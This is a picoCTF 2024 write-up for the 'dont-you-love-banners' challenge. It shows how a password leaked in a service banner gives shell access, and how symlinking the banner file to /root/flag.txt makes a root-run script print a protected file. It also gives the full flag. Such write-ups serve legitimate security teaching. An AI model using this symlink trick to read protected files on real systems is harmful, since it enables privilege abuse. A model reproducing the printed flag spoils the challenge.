# dont-you-love-banners
- Difficulty: Medium
- Category: `General Skills`  
- Date: 2024-09-21  
tags: `picoCTF 2024` `shell` `browser_webshell_solvable`  
refer to [Source](https://play.picoctf.org/practice/challenge/437?category=5&page=3)

## Description
Can you abuse the banner?
The server has been leaking some crucial information on `tethys.picoctf.net 52619`. Use the leaked information to get to the server.
To connect to the running application use `nc tethys.picoctf.net 53208.` From the above information abuse the machine and find the flag in the /root directory.

## Hints
- Do you know about symlinks?
- Maybe some small password cracking or guessing

## Solution
First, use netcat `tethys.picoctf.net 52619` to see leaked information.
``` shell
$nc tethys.picoctf.net 52619
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```
Then we get the password for tethys.picoctf.net 53208. access it and answer some question.
``` shell
$nc tethys.picoctf.net 53208
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```
``` shell
# in player@challenge:~$
$ls
banner  text
$cat banner
*************************************
**************WELCOME****************
*************************************
$cat text
keep digging
$ls /root
flag.txt  script.py
$cat /root/flag.txt
cat: /root/flag.txt: Permission denied
$cat /root/script.py
...
```
``` python
# /root/script.py
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```
There is a important thing:
``` python
with open("/home/player/banner", "r") as f:
    print(f.read())
```
And hint said that Do you know about symlinks?  
So link /root/flag.txt to banner
``` shell
$rm banner
$ln -s /root/flag.txt banner
```
And just exit, then access again.
``` shell
$nc tethys.picoctf.net 53208
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}

what is the password?
```
``` plain
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```

### Improving
